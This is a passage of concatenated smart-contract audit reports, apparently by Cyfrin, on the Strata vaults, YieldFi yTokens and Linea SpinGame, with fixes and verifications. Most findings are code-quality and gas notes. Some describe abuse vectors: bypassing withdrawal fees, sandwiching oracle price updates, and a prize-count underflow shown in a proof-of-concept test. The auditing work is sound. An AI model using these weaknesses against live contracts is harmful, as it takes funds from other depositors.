@>      uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);
        return USDeAssets;
    }

    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
@>      uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets); // @audit - this can revert if passing yUSDe as the caller when it has no pUSDe balance
        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);
        return USDeAssets;
    }

    function previewDeposit(uint256 pUSDeAssets) public view override returns (uint256) {
        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);

@>      uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor); // @audit - should explicitly handle the case where totalAccruedUSDe() returns zero rather than relying on _valueMulDiv() behaviour
        return yUSDeShares;
    }

    function previewMint(uint256 yUSDeShares) public view override returns (uint256) {
@>      uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil); // @audit - should explicitly handle the case where totalAccruedUSDe() and/or totalAssets() returns zero rather than relying on _valueMulDiv() behaviour
        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);
        return pUSDeAssets;
    }

    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {
        return value.mulDiv(mulValue + 1, divValue + 1, rounding);
    }
```

As noted using `// @audit` tags in the code snippets above, `yUSDeVault::previewMint` and `yUSDeVault::previewDeposit` can revert for multiple reasons, including:
* when the pUSDe balance of the yUSDe vault is zero.
* when `pUSDeVault::previewRedeem` reverts due to division by zero in `pUSDeVault::previewYield`, invoked from `_convertAssetsToUSDe()` within `totalAccruedUSDe()`.

```solidity
     function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {

            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);

@>          uint y_pUSDeShares = balanceOf(caller); // @audit - should return early if this is zero to avoid reverting below
@>          uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }

    function previewRedeem(address caller, uint256 shares) public view virtual returns (uint256) {
        return previewRedeem(shares) + previewYield(caller, shares);
    }
```

While a subset of these reverts could be considered "due to other conditions that would also cause deposit to revert", such as due to overflow, it would be better to explicitly handle these other edge cases. Additionally, even when called in isolation `yUSDeVault::totalAccruedUSDe` will revert if the pUSDe balance of the yUSDeVault is zero. Instead, this should simply return zero.

**Strata:** Fixed in commit [0f366e1](https://github.com/Strata-Money/contracts/commit/0f366e192941c875b651ee4db89b9fd3242a5ac0).

**Cyfrin:** Verified. The zero assets/shares edge cases are now explicitly handled in `yUSDeVault::_convertAssetsToUSDe` and pUSDeVault::previewYield`, including when the `yUSDe` state is not initialized as so will be equal to the zero address.

\clearpage
## Informational


### Use named mappings to explicitly denote the purpose of keys and values

**Description:** Use named mappings to explicitly denote the purpose of keys and values:
```solidity
predeposit/MetaVault.sol
23:    // Track the assets in the mapping for easier access
24:    mapping(address => TAsset) public assetsMap;

predeposit/pUSDeDepositor.sol
35:    mapping (address => TAutoSwap) autoSwaps;

test/MockStakedUSDe.sol
20:  mapping(address => UserCooldown) public cooldowns;
```

**Strata:** Fixed in commit [ab231d9](https://github.com/Strata-Money/contracts/commit/ab231d99e4ba6c7c82c4928515775a39dc008808).

**Cyfrin:** Verified.


### Disable initializers on upgradeable contracts

**Description:** Disable initializers on upgradeable contracts:
* `yUSDeVault`
* `yUSDeDepositor`
* `pUSDeVault`
* `pUSDeDepositor`

```diff
+    /// @custom:oz-upgrades-unsafe-allow constructor
+    constructor() {
+       _disableInitializers();
+    }
```

**Strata:** Fixed in commit [49060b2](https://github.com/Strata-Money/contracts/commit/49060b25230389feff54597a025a7aa129ceb9f3).

**Cyfrin:** Verified.


### Don't initialize to default values

**Description:** Don't initialize to default values as Solidity already does this:
```solidity
predeposit/MetaVault.sol
220:        for (uint i = 0; i < length; i++) {
241:        for (uint i = 0; i < assetsArr.length; i++) {
```

**Strata:** Fixed in commit [07b471f](https://github.com/Strata-Money/contracts/commit/07b471f8292d62098ee4ffd97e62d6f0854d96ce).

**Cyfrin:** Verified.


### Use explicit sizes instead of `uint`

**Description:** While `uint` defaults to `uint256`, it is considered good practice to use the explicit types including the size and to avoid using `uint`:
```solidity
predeposit/yUSDeDepositor.sol
65:        uint beforeAmount = asset.balanceOf(address(this));
73:        uint pUSDeShares = pUSDeDepositor.deposit(asset, amount, address(this));

predeposit/MetaVault.sol
53:        uint baseAssets = IERC4626(token).previewRedeem(tokenAssets);
54:        uint shares = previewDeposit(baseAssets);
70:        uint baseAssets = previewMint(shares);
71:        uint tokenAssets = IERC4626(token).previewWithdraw(baseAssets);
211:        uint balance = IERC20(vaultAddress).balanceOf(address(this));
219:        uint length = assetsArr.length;
220:        for (uint i = 0; i < length; i++) {
240:    function redeemRequiredBaseAssets (uint baseTokens) internal {
241:        for (uint i = 0; i < assetsArr.length; i++) {
243:            uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));

predeposit/pUSDeVault.sol
62:            uint total_sUSDe = sUSDe.balanceOf(address(this));
63:            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);
65:            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);
67:            uint y_pUSDeShares = balanceOf(caller);
68:            uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);
121:            uint sUSDeAssets = sUSDe.previewWithdraw(assets);
138:        uint USDeBalance = USDe.balanceOf(address(this));
171:        uint USDeBalance = USDe.balanceOf(address(this));

predeposit/yUSDeVault.sol
38:        uint pUSDeAssets = super.totalAssets();
39:        uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);
43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
44:        uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets);
45:        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);
59:        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);
60:        uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor);
74:        uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil);
75:        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);

```

**Strata:** Fixed in commit [61f5910](https://github.com/Strata-Money/contracts/commit/61f591088754e2666355307cf1e11e6440af8572).

**Cyfrin:** Verified.


### Prefix internal and private function names with `_` character

**Description:** It is considered good practice in Solidity to prefix internal and private function names with `_` character. This is done sometimes but not other times; ideally apply this consistently:
```solidity
predeposit/PreDepositPhaser.sol
15:    function setYieldPhaseInner () internal {

predeposit/yUSDeDepositor.sol
54:    function deposit_pUSDe (address from, uint256 amount, address receiver) internal returns (uint256) {
62:    function deposit_pUSDeDepositor (address from, IERC20 asset, uint256 amount, address receiver) internal returns (uint256) {

predeposit/PreDepositVault.sol
59:    function onAfterDepositChecks () internal view {
64:    function onAfterWithdrawalChecks () internal view {

predeposit/pUSDeVault.sol
93:    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
115:    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {
177:    function stakeUSDe(uint256 USDeAssets) internal returns (uint256) {

predeposit/yUSDeVault.sol
43:    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
79:    function _deposit(address caller, address receiver, uint256 pUSDeAssets, uint256 shares) internal override {
86:    function _withdraw(address caller, address receiver, address owner, uint256 pUSDeAssets, uint256 shares) internal override {
101:    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {

predeposit/MetaVault.sol
84:    function _deposit(address token, address caller, address receiver, uint256 baseAssets, uint256 tokenAssets, uint256 shares) internal virtual {
160:    ) internal virtual {
175:    function requireSupportedVault(address token) internal view {
191:    function addVaultInner (address vaultAddress) internal {
209:    function removeVaultAndRedeemInner (address vaultAddress) internal {
231:    function redeemMetaVaults () internal {
240:    function redeemRequiredBaseAssets (uint baseTokens) internal {

predeposit/pUSDeDepositor.sol
92:    function deposit_sUSDe (address from, uint256 amount, address receiver) internal returns (uint256) {
102:    function deposit_USDe (address from, uint256 amount, address receiver) internal returns (uint256) {
114:    function deposit_viaSwap (address from, IERC20 token, uint256 amount, address receiver) internal returns (uint256) {
146:    function getPhase () internal view returns (PreDepositPhase phase) {

test/ethena/StakedUSDe.sol
190:  function _checkMinShares() internal view {
203:    internal
225:    internal
239:  function _updateVestingAmount(uint256 newVestingAmount) internal {
251:  function _beforeTokenTransfer(address from, address to, uint256) internal virtual {

test/ethena/SingleAdminAccessControl.sol
72:  function _grantRole(bytes32 role, address account) internal override returns (bool) {
```

**Strata:** Fixed in commit [b154fec](https://github.com/Strata-Money/contracts/commit/b154fec8957a81b3c0cf6e204e894d60bb0d852b).

**Cyfrin:** Verified.


### Use unchained initializers instead

**Description:** The direct use of initializer functions rather than their unchained equivalents should be avoided to prevent [potential duplicate initialization](https://docs.openzeppelin.com/contracts/5.x/upgradeable#multiple-inheritance).

**Strate:**
Fixed in commit [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e).

**Cyfrin:** Verified.


### Missing zero deposit amount validation


**Description:** Unlike `pUSDeDepositor::deposit_USDe`, `pUSDeDepositor::deposit_sUSDe` does not enforce that the deposited amount is non zero:

```solidity
require(amount > 0, "Deposit is zero");
```

A similar case is present when comparing `yUSDeDepositor::deposit_pUSDeDepositor` and `yUSDeDepositor::deposit_pUSDe`.

**Strata:** Fixed in commit [1378b6a](https://github.com/Strata-Money/contracts/commit/1378b6af08e60aaa768693a9332e98dbb4f01776).

**Cyfrin:** Verified.


### `PreDepositVault::initialize` should not be exposed as public

**Description:** `PreDepositVault::initialize` is currently exposed as public. Based on the `pUSDeVault` and `yUSDeVault` implementations that invoke this super function, it is not intended. While this does not appear to be exploitable or cause any issues that prevent initialization, it would be better to mark this base implementation as internal and use the `onlyInitializing` modifier instead.

```diff
    function initialize(
        address owner_
        , string memory name
        , string memory symbol
        , IERC20 USDe_
        , IERC4626 sUSDe_
        , IERC20 stakedAsset
--  ) public virtual initializer {
++  ) internal virtual onlyInitializing {
        __ERC20_init(name, symbol);
        __ERC4626_init(stakedAsset);
        __Ownable_init(owner_);

        USDe = USDe_;
        sUSDe = sUSDe_;
    }
```

**Strata:** Fixed in commits [6ac05c2](https://github.com/Strata-Money/contracts/commit/6ac05c232a47de6e9935fd6e20af1f0c4540c457) and [def7d36](https://github.com/Strata-Money/contracts/commit/def7d360225f49662c73bf968d63d935c82d9d0e).

**Cyfrin:** Verified. `PreDepositVault::initialize` is now marked as internal and uses the `onlyInitializing` modifier.


### Inconsistency in `currentPhase` between `pUSDeVault` and `yUSDeVault`

**Description:** Both `pUSDeVault` and `yUSDeVault` inherit the `PreDepositVault` which in turn inherits the `PreDepositPhaser`; however, there is an inconsistency between the state of `pUSDe::currentPhase`, which is updated when the phase changes, and `yUSDe::currentPhase`, which is never updated and is thus always the default `PointsPhase` variant. This is assumedly not an issue given that this state is never needed for the yUSDe vault, though a view function is exposed by virtue of the state variable being public which could cause confusion.

**Recommended Mitigation:** The simplest solution would be modifying this state to be internal by default and only expose the corresponding view function within `pUSDeVault`.

**Strata:** Fixed in commit [aac3b61](https://github.com/Strata-Money/contracts/commit/aac3b617084fb5a06b29728a9f52e5884b062b6a).

**Cyfrin:** Verified. The `yUSDeVault` now returns the `pUSDeVault` phase state.

\clearpage
## Gas Optimization


### Cache identical storage reads

**Description:** As reading from storage is expensive, it is more gas-efficient to cache values and read them from the cache if the storage has not changed. Cache identical storage reads:

`PreDepositPhaser.sol`:
```solidity
// use PreDepositPhase.YieldPhase instead
19:        emit PhaseStarted(currentPhase);
```

`pUSDeDepositor.sol`:
```solidity
// cache sUSDe and pUSDe to save 3 storage reads
// also change `deposit` to cache `sUSDe` and pass it as input to `deposit_sUSDe` saves 1 more storage read
96:            SafeERC20.safeTransferFrom(sUSDe, from, address(this), amount);
98:        sUSDe.approve(address(pUSDe), amount);
99:        return IMetaVault(address(pUSDe)).deposit(address(sUSDe), amount, receiver);

// cache USDe and pUSDe to save 2 storage reads
// also change `deposit` to cache `USDe` and pass it as input to `deposit_USDe` saves 1 more storage read
107:            SafeERC20.safeTransferFrom(USDe, from, address(this), amount);
110:        USDe.approve(address(pUSDe), amount);
111:        return pUSDe.deposit(amount, receiver);

// cache USDe to save 2 storage reads
// also change `deposit` to cache `USDe` and `autoSwaps[address(asset)]` then pass them as inputs to `deposit_viaSwap` saves 2 more storage reads
127:        uint256 USDeBalance = USDe.balanceOf(address(this));
130:            tokenOut: address(USDe),
140:        uint256 amountOut = USDe.balanceOf(address(this)) - USDeBalance;
```

`yUSDeDepositor.sol`:
```solidity
// cache pUSDe and yUSDe to save 2 storage reads
56:            SafeERC20.safeTransferFrom(pUSDe, from, address(this), amount);
58:        pUSDe.approve(address(yUSDe), amount);
59:        return yUSDe.deposit(amount, receiver);
```

`MetaVault.sol`:
```solidity
// cache assetsArr.length
241:        for (uint i = 0; i < assetsArr.length; i++) {
```

**Strata:** Fixed in commit [9a19939](https://github.com/Strata-Money/contracts/commit/9a1993975912fbcbaf684811b25de229947671c9).

**Cyfrin:** Verified.


### Using `calldata` is more efficient to `memory` for read-only external function inputs

**Description:** Using `calldata` is more efficient to `memory` for read-only external function inputs:

`PreDepositVault`:
```solidity
35:        , string memory name
36:        , string memory symbol
```

**Strata Money:**
"initialize" (__init_Vault) is now internal, so the calldata can't be used with the parameters.

**Cyfrin:** Acknowledged.


### Use named returns where this can eliminate in-function variable declaration

**Description:** Use named returns where this can eliminate in-function variable declaration:

* `yUSDeVault` : functions `totalAccruedUSDe`, `_convertAssetsToUSDe`, `previewDeposit`, `previewMint`
* `pUSDeVault` : function `previewYield`
* `MetaVault` : functions `deposit`, `mint`, `withdraw`, `redeem`

**Strata:** Fixed in commits [3241635](https://github.com/Strata-Money/contracts/commit/32416357ac166b072e4339471107e40950952a08) and [c68a705](https://github.com/Strata-Money/contracts/commit/c68a7053097a1909c13c98b6a5678a102f3f5007).

**Cyfrin:** Verified.


### Inline small internal functions only used once

**Description:** It is more gas efficient to inline small internal functions only used once.

For example `pUSDeDepositor::getPhase` is only called by `deposit_sUSDe`. Changing `deposit_sUSDe` to cache `pUSDe` then use the cached copy in the call to `PreDepositPhaser::currentPhase` saves 1 storage read in addition to saving the function call overhead.

**Strata:** Fixed in commit [9398379](https://github.com/Strata-Money/contracts/commit/93983791adbd45a555d947a12a5a6fd9bbfe7330).

**Cyfrin:** Verified.


### `PreDepositVault` checks should fail early

**Description:** `PreDepositVault` implements after deposit/withdrawal checks to enforce several invariants; however, it is only necessary to check the minimum shares violation after execution of the calling functions. To consume less gas, it is better to split these checks into separate before/after functions and revert early if either deposits or withdrawals are disabled.

```solidity
function onAfterDepositChecks () internal view {
    if (!depositsEnabled) {
        revert DepositsDisabled();
    }
}
function onAfterWithdrawalChecks () internal view {
    if (!withdrawalsEnabled) {
        revert WithdrawalsDisabled();
    }
    if (totalSupply() < MIN_SHARES) {
        revert MinSharesViolation();
    }
}
```

**Strata:** Acknowledged, as the pause state is considered an edge case, so in normal use users would instead benefit from a single method call for all the required checks.

**Cyfrin:** Acknowledged.


### Superfluous vault support validation can be removed from `pUSDeDepositor::deposit`

**Description:** If the caller to `pUSDeDepositor::deposit` attempts to deposit a vault token that is not `USDe` or one of those preconfigured with an auto swap path, it will first query `MetaVault::isAssetSupported`:

```solidity
    function deposit(IERC20 asset, uint256 amount, address receiver) external returns (uint256) {
        address user = _msgSender();
        ...
        IMetaVault vault = IMetaVault(address(pUSDe));
@>      if (vault.isAssetSupported(address(asset))) {
            SafeERC20.safeTransferFrom(asset, user, address(this), amount);
            asset.approve(address(vault), amount);
            return vault.deposit(address(asset), amount, receiver);
        }
@>      revert InvalidAsset(address(asset));
    }
```

If the specified vault token fails all validation then it falls through to the `InvalidAsset` custom error; however, this is not strictly necessary as `MetaVault::deposit` already performs the same validation within `MetaVault::requireSupportedVault`:

```solidity
    function deposit(address token, uint256 tokenAssets, address receiver) public virtual returns (uint256) {
        if (token == asset()) {
            return deposit(tokenAssets, receiver);
        }
@>      requireSupportedVault(token);
        ...
    }

    function requireSupportedVault(address token) internal view {
        address vaultAddress = assetsMap[token].asset;
        if (vaultAddress == address(0)) {
@>          revert UnsupportedAsset(token);
        }
    }
```

**Recommended Mitigation:** If it is not intentionally desired to fail early, consider removing the superfluous validation to save gas in the happy path case:

```diff
function deposit(IERC20 asset, uint256 amount, address receiver) external returns (uint256) {
        address user = _msgSender();
        ...
        IMetaVault vault = IMetaVault(address(pUSDe));
--      if (vault.isAssetSupported(address(asset))) {
            SafeERC20.safeTransferFrom(asset, user, address(this), amount);
            asset.approve(address(vault), amount);
            return vault.deposit(address(asset), amount, receiver);
--      }
--      revert InvalidAsset(address(asset));
    }
```

**Strata:** Fixed in commit [7f0c5dc](https://github.com/Strata-Money/contracts/commit/7f0c5dc54d1230589e2d9403b69effd64fb35227).

**Cyfrin:** Verified.


### Remove unused return value from `pUSDeVault::stakeUSDe` and explicitly revert if `USDeAssets == 0`

**Description:** Remove unused return value from `pUSDeVault::stakeUSDe` and explicitly revert if `USDeAssets == 0`.

**Strata:** Fixed in commit [513d589](https://github.com/Strata-Money/contracts/commit/513d5890771d9bbe520740ef8f26a24931bf5590).

**Cyfrin:** Verified.


### Unnecessarily complex iteration logic in `MetaVault::redeemMetaVaults` can be simplified

**Description:** `MetaVault::redeemMetaVaults` is currently implemented as a while loop, indexing the first array element and calling `MetaVault::removeVaultAndRedeemInner` which implements a "replace-and-pop" solution for removing elements from the `assetsArr` array:

```solidity
    function removeVaultAndRedeemInner (address vaultAddress) internal {
        // Redeem
        uint balance = IERC20(vaultAddress).balanceOf(address(this));
        if (balance > 0) {
            IERC4626(vaultAddress).redeem(balance, address(this), address(this));
        }

        // Clean
        TAsset memory emptyAsset;
        assetsMap[vaultAddress] = emptyAsset;
        uint length = assetsArr.length;
        for (uint i = 0; i < length; i++) {
            if (assetsArr[i].asset == vaultAddress) {
@>              assetsArr[i] = assetsArr[length - 1];
@>              assetsArr.pop();
                break;
            }
        }
    }

    function redeemMetaVaults () internal {
        while (assetsArr.length > 0) {
@>          removeVaultAndRedeemInner(assetsArr[0].asset);
        }
    }
```

While this logic is still required for use in `MetaVault::removeVault`, where the contract admin can manually remove a single underlying vault, it would be preferable to avoid re-using this functionality for `MetaVault::redeemMetaVaults`. Instead, starting at the final element and walking backwards would preserve the ordering of the array and avoid unnecessary storage writes.

**Strata:** Fixed in commit [fbb6818](https://github.com/Strata-Money/contracts/commit/fbb6818f5c1f621a25c58a40f1673609ad9611fb) and [98bd92d](https://github.com/Strata-Money/contracts/commit/98bd92d0aed75161332227239859c34161df1bcc).

**Cyfrin:** Verified. The logic has been simplified by iterating over the asset addresses, deleting the individual mapping entries, and finally deleting the array.


\clearpage

------ FILE END car/reports_md/2025-06-11-cyfrin-strata-predeposit-v2.1.md ------


------ FILE START car/reports_md/2025-06-17-cyfrin-yieldfi-pr19-vytoken-v2.2.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

**Assisting Auditors**

[Alex Roan](https://twitter.com/alexroan)

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

---

# Findings
## Low Risk


### Instant withdrawals via Manager bypass withdrawal fee

**Description:** When a user performs a withdrawal, if the amount is small enough and sufficient assets are available in the `Manager`, the withdrawal can be completed instantly in [`Manager::redeem`](https://github.com/YieldFiLabs/contracts/blob/e43fa029e2af65dae447882c53777e3bed387385/contracts/core/Manager.sol#L203-L208):

```solidity
// if redeeming yToken.asset() and vaultAssetAmount is less than maxRedeemCap and balance of contract is greater than vaultAssetAmount, redeem immediately and return
if (_asset == IERC4626(_yToken).asset() && vaultAssetAmount <= maxRedeemCap[_yToken] && IERC20(_asset).balanceOf(address(this)) >= vaultAssetAmount) {
    IERC20(_asset).safeTransfer(_receiver, vaultAssetAmount);
    emit InstantRedeem(caller, _yToken, _asset, _receiver, vaultAssetAmount);
    return;
}
```

However, this bypasses the fee applied in the asynchronous [`_withdraw`](https://github.com/YieldFiLabs/contracts/blob/e43fa029e2af65dae447882c53777e3bed387385/contracts/core/Manager.sol#L379-L395) flow.

**Impact:** Withdrawals can be initiated through both the `ERC4626` YToken vaults and directly via the `Manager` contract. This allows users to circumvent the fee applied in the YToken withdrawal path by opting for instant withdrawals directly through the `Manager`.

**Recommended Mitigation:** Consider taking the fee also in the instant withdrawal flow.

**YieldFi:** Acknowledged. Currently fees are set to 0 hence this doesn't affect the protocol fees.

\clearpage
## Informational


### `isNewYToken` can be omitted in YToken contracts

**Description:** To support the accounting of underlying assets, a new parameter `isNewYToken` was introduced in `mintYToken`. This parameter is used in the [`dYTokenL1::mintYToken`](https://github.com/YieldFiLabs/contracts/blob/702a931df3adb2f6e48807203cdc7a92604ea249/contracts/core/tokens/dYTokenL1.sol#L67-L81) and [`dYTokenL2::mintYToken`](https://github.com/YieldFiLabs/contracts/blob/702a931df3adb2f6e48807203cdc7a92604ea249/contracts/core/tokens/dYTokenL2.sol#L65-L79) contracts to determine whether minting `dYTokens` should also update the balances of the underlying `YTokens`.

However, the parameter is unused in the [`YToken`](https://github.com/YieldFiLabs/contracts/blob/702a931df3adb2f6e48807203cdc7a92604ea249/contracts/core/tokens/YToken.sol#L215-L225) and [`YTokenL2`](https://github.com/YieldFiLabs/contracts/blob/702a931df3adb2f6e48807203cdc7a92604ea249/contracts/core/tokens/YTokenL2.sol#L198-L208) implementations:

```solidity
function mintYToken(address to, uint256 shares, bool isNewYToken) external virtual {
    require(msg.sender == manager, "!manager");
    _mint(to, shares);
}
```

Consider omitting the parameter to make its unused status explicit:

```diff
- function mintYToken(address to, uint256 shares, bool isNewYToken) external virtual {
+ function mintYToken(address to, uint256 shares, bool ) external virtual {
```

**YieldFi:** Fixed in commit [`a3a9bad`](https://github.com/YieldFiLabs/contracts/commit/a3a9badf7a2ef877e128add79f52453a5cbc0fa5)

**Cyfrin:** Verified. `isNewYToken` is now removed from the above function parameter declarations.


### Redundant `virtual` declaration in` YToken::_withdraw`

**Description:** In the [pull request](https://github.com/YieldFiLabs/contracts/pull/19), the function [`YToken::_withdraw`](https://github.com/YieldFiLabs/contracts/blob/702a931df3adb2f6e48807203cdc7a92604ea249/contracts/core/tokens/YToken.sol#L193) was updated to be declared `virtual`, allowing it to be overridden in derived contracts. However, it is never actually overridden in any of the `dYToken` implementations.

Consider removing the `virtual` modifier from both `YToken::_withdraw` and `YTokenL2::_withdraw` to clarify intent and avoid misleading extensibility.

**YieldFi:** Acknowledged.


### Price Change Sensitivity in Instant Withdrawals

**Description:** Since instant withdrawals allow users to withdraw the underlying asset immediately, they can potentially react to price changes in a way that introduces economic inefficiencies. Because prices are delivered via an oracle on L2, this creates two potential vectors for abuse:

1. Cross-chain arbitrage: Large price discrepancies between L1 and L2 can be exploited by users performing arbitrage across chains.
2. Sandwiching price updates: If a user observes a significant price movement, they can deposit just before the change and withdraw immediately aftercapturing the gain at the expense of existing holders. This also works in reverse: a user can withdraw just before a large drop, avoiding losses that others would bear.

This behavior is already mitigated to some extent by the cap on instant withdrawals, which limits the amount a user can redeem at once, and by keeping only a limited balance available for instant redemptions.

However, it may be beneficial to monitor the price delta between L1 and L2 or to detect significant price swings. In such cases, consider pausing the contract to prevent potential abuse during volatile conditions.

**YieldFi:** Acknowledged. The price differences between L1 and L2, as well as short-term price movements, are typically small. Under normal conditions, this behavior is unlikely to be profitable. In the case of a catastrophic event, the affected vaults can be paused while changes are addressed.

\clearpage
## Gas Optimization


### Avoid unnecessary computation in `dYToken::mintYToken` when `isNewYToken == false`

**Description:** In the new [`dYToken::mintYToken`](https://github.com/YieldFiLabs/contracts/blob/702a931df3adb2f6e48807203cdc7a92604ea249/contracts/core/tokens/dYTokenL1.sol#L67-L81), there is special logic for handling newly minted `dYTokens`, i.e., tokens generated through deposits or accrued fees:

```solidity
function mintYToken(address to, uint256 shares, bool isNewYToken) external override {
    require(msg.sender == manager, "!manager");
    uint256 assets = convertToAssets(shares);

    // if isNewYToken i.e external deposit has triggered minting of dyToken, we mint yToken to this contract
    if(isNewYToken) {
        // corresponding shares of yToken based on assets
        uint256 yShares = YToken(yToken).convertToShares(assets);
        // can pass isNewYToken here as it is not used in yToken
        ManageAssetAndShares memory manageAssetAndShares = ManageAssetAndShares({
            yToken: yToken,
            shares: yShares,
            assetAmount: assets,
            updateAsset: true,
            isMint: true,
            isNewYToken: isNewYToken
        });
        IManager(manager).manageAssetAndShares(address(this), manageAssetAndShares);
    }
    // minting dYToken to receiver
    _mint(to, shares);
}
```

The `assets` variable is only used within the `if (isNewYToken)` block. Moving its declaration inside the block would save gas when `isNewYToken == false`, by avoiding unnecessary computation:

```diff
function mintYToken(address to, uint256 shares, bool isNewYToken) external override {
    require(msg.sender == manager, "!manager");
-   uint256 assets = convertToAssets(shares);

    // if isNewYToken i.e external deposit has triggered minting of dyToken, we mint yToken to this contract
    if(isNewYToken) {
+       uint256 assets = convertToAssets(shares);
        // corresponding shares of yToken based on assets
        uint256 yShares = YToken(yToken).convertToShares(assets);
```

**YieldFi:** Fixed in commit [`f1f6996`](https://github.com/YieldFiLabs/contracts/commit/f1f69960c4d6d84aa8fe7658ac535a79fb77f505)

**Cyfrin:** Verified. `convertToAssets` now moved inside the if-statmement.

\clearpage

------ FILE END car/reports_md/2025-06-17-cyfrin-yieldfi-pr19-vytoken-v2.2.md ------


------ FILE START car/reports_md/2025-06-30-cyfrin-linea-spingame-v2-v2.1.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[Hans](https://twitter.com/hansfriese)


---

# Findings
## Low Risk


### Lack of validation when updating prizes can lead to `lotAmount` underflow when randomness is fulfilled

**Description:** In [`SpinGame::_fulfillRandomness`](https://github.com/Consensys/linea-hub/blob/0af327319636960e9683897c5935aa1a78d1ded5/contracts/src/Spin.sol#L595-L603), there's an `unchecked` block that decrements `prize.lotAmount` without validating its current value:

```solidity
/// Should never underflow due to earlier check.
unchecked {
    prize.lotAmount -= 1;
}

if (prize.lotAmount == 0) {
    totalProbabilities -= prizeProbability;
    prize.probability = 0;
}
```

However, the comment claiming that the underflow is prevented by "an earlier check" is outdated as the check was removed in commit [`db6ae3d`](https://github.com/Consensys/linea-hub/commit/db6ae3d7a68497ac1077297ab0a16b9c13bd9a73#diff-ca99e3568f81fcb74ee275bb22d15e8216159decd2a4cc2e7c4572f639bb27c3R536), making the assumption incorrect. As a result, if a prize is added with a `lotAmount` of 0, the unchecked decrement will underflow to `type(uint32).max`.

**Impact:** This underflow results in the prize appearing to have an extremely large `lotAmount`, allowing users to repeatedly win and claim that prize well beyond the intended quantity. While this requires a misconfiguration by an admin (e.g. setting `lotAmount = 0`), such errors are plausible in practice and could go unnoticed.


**Proof of Concept:** The following test demonstrates the underflow in `lotAmount` when a prize is registered with `lotAmount = 0`:
```solidity
function testFulfillRandomnessWith0LotAmount() external {
    MockERC20 token = new MockERC20("Test Token", "TST");
    ISpinGame.Prize[] memory prizesToUpdate = new ISpinGame.Prize[](1);
    uint256[] memory empty = new uint256[](0);

    prizesToUpdate[0] = ISpinGame.Prize({
        tokenAddress: address(token),
        amount: 500 * 1e18,
        lotAmount: 0,
        probability: 1e8,
        availableERC721Ids: empty
    });

    vm.prank(controller);
    spinGame.updatePrizes(prizesToUpdate);

    uint64 nonce = 1;
    uint64 expirationTimestamp = uint64(block.timestamp + 1);
    uint64 boost = 1e8;

    ISpinGame.ParticipationRequest memory request = ISpinGame.ParticipationRequest({
        user: user,
        expirationTimestamp: expirationTimestamp,
        nonce: nonce,
        boost: boost
    });

    bytes32 messageHash = spinGame.hashParticipationExt(request);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signer, messageHash);
    ISpinGame.Signature memory signature = ISpinGame.Signature(r, s, v);

    assertFalse(spinGame.nonces(user, nonce));

    vm.prank(user);
    uint256 requestId = spinGame.participate(nonce, expirationTimestamp, boost, signature);
    assertTrue(spinGame.nonces(user, nonce));

    bytes memory extraData = new bytes(0);
    bytes memory data = abi.encode(requestId, extraData);

    uint256 round = 15608646;
    bytes memory dataWithRound = abi.encode(round, data);

    vm.prank(vrfOperator);
    spinGame.fulfillRandomness(2, dataWithRound);

    uint32[] memory prizeIds = new uint32[](1);
    prizeIds[0] = 0;
    uint256[] memory amounts = spinGame.getUserPrizesWon(user, prizeIds);
    assertEq(amounts[0], 1);
    assertEq(spinGame.hasWonPrize(user, 0), true);

    ISpinGame.Prize memory prize = spinGame.getPrize(0);
    assertEq(prize.lotAmount,type(uint32).max);
}
```

**Recommended Mitigation:** To prevent this underflow, validate that `lotAmount > 0` when registering new prizes in `_addPrizes`:

```diff
    uint32 lotAmount = _prizes[i].lotAmount;

+   if (lotAmount == 0) {
+       revert InvalidLotAmount();
+   }

    if (prizeAmount == 0) {
        if (erc721IdsLen != lotAmount) {
            revert MismatchERC721PrizeAmount(erc721IdsLen, lotAmount);
        }
    } else {
        if (erc721IdsLen != 0) {
            revert ERC20PrizeWrongParam();
        }
    }
```

This ensures that any prize expected to be distributed has a non-zero quantity, eliminating the possibility of underflow during fulfillment.

